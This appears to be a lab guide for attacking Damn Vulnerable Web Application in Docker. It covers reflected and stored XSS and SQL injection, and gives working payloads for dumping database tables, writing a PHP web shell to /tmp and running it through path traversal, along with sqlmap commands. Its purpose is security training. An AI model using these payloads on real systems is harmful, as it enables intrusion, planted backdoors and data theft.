# Setup

This was done on a Ubuntu 16.04 server.

## Install Docker

```
$ sudo apt-get update && apt-get install docker.io
$ sudo systemctl start docker
```

## Setup Damn Vulnerable Web Application (DVWA)

Pull the image from DockerHub:
```
$ sudo docker pull citizenstig/dvwa
```

Fire up the container:
```
$ sudo docker run -d -p 80:80 citizenstig/dvwa:latest
```

1. DVWA is now available at http://[host-ip]
2. Follow the instructions to setup the MySQL database
3. Refresh and login, default username is `admin` and the default password is `password`

# Recon


# Finding vulnerabilities

## Cross Site Scripting (XSS)

1. Go to http://[host-ip]/security.php and set security level to low.
2. Go to http://[host-ip]/vulnerabilities/xss_r/. Explore the functionality.
3. Reflect on the source code by clicking "View Source" in the bottom right.
4. Play around with some input, does the application reflect `<`, `'`, `"`?
5. Can you put actual HTML tags in there, like `<pre>`, `<a>`?
6. Attempt to use the classic `<script>alert(1)</script>` to check for XSS.
7. Show the same with the persistant/stored XSS at http://[host-ip]/vulnerabilities/xss_s/

## SQL Injection (SQLi)

1. Go to http://[host-ip]/security.php and set security level to low.
2. Go to http://[host-ip]/vulnerabilities/sqli/ and explore the functionality
3. View the source by clicking "View Source" in the bottom right.
4. Input a single quote `'` into the input field.
	Makes query: `"SELECT first_name, last_name FROM users WHERE user_id = '''"; 
5. Input `1' OR 1=1;#` into the input field. 
	Makes query: `"SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1;#'"; 
6. Demonstrate that arbitrary information can be received:
	`1' union select all 1,@@version;#`
	`1' union select all 1,table_name FROM information_schema.tables;#`
7. Show that files can be written too:
	`1' union select all 1,"<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/tmp/backdoor.php'`
8. Take advantage of it with path traversal vulnerability:
	http://[host-ip]/vulnerabilities/fi/?page=../../../../../tmp/backdoor.php&cmd=id
9. Run `sqlmap -u "http://[host-ip]/vulnerabilities/sqli/?id=123&Submit=Submit#"`.
10. Fetch cookie values from CookieManager+
11. Run `sqlmap -u "http://[host-ip]/vulnerabilities/sqli/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=[SESSION FROM COOKIES]"`
12. Run `sqlmap -u "http://[host-ip]/vulnerabilities/sqli/?id=123&Submit=Submit#" --cookie="security=low; PHPSESSID=[SESSION FROM COOKIES]" --tables`

# Exploitation

## BeEf Command and Control using XSS

## Reverse shell using SQLi

# Resources

## Vulnerable applicaions
1. Damn Vulnerable Web Application: http://www.dvwa.co.uk/
3. WebGoat: https://github.com/WebGoat/WebGoat
2. Mutillidae 2: https://www.owasp.org/index.php/OWASP_Mutillidae_2_Project

